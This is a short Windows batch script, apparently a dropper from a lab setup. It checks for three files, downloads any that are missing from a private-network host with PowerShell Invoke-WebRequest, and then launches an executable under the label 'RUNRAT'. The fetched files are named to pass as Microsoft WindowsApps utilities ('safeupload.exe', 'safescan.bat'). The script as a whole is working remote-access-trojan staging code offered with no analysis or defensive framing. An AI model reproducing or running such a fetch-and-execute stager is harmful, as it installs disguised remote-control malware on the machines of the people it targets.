@ECHO OFF

IF NOT EXIST C:\ProgramData\ra7.exe (
   GOTO REDOWN1
)

:CHECK2
IF NOT EXIST '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\safeupload.exe' (
   GOTO REDOWN2
)

:CHECK3
IF NOT EXIST '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\safescan.bat' (
   GOTO REDOWN3
)

GOTO RUNRAT

:REDOWN1
   powershell -Command "Invoke-WebRequest http://192.168.56.101/ra7.exe -OutFile C:\ProgramData\ra7.exe"
   GOTO CHECK2

:REDOWN2
   powershell -Command "Invoke-WebRequest http://192.168.56.101/safeupload.exe -OutFile '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\safeupload.exe'"
   GOTO CHECK3

:REDOWN3
   powershell -Command "Invoke-WebRequest http://192.168.56.101/safescan.bat -OutFile '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\safescan.bat'"

:RUNRAT
powershell -Command "& C:\ProgramData\ra7.exe"
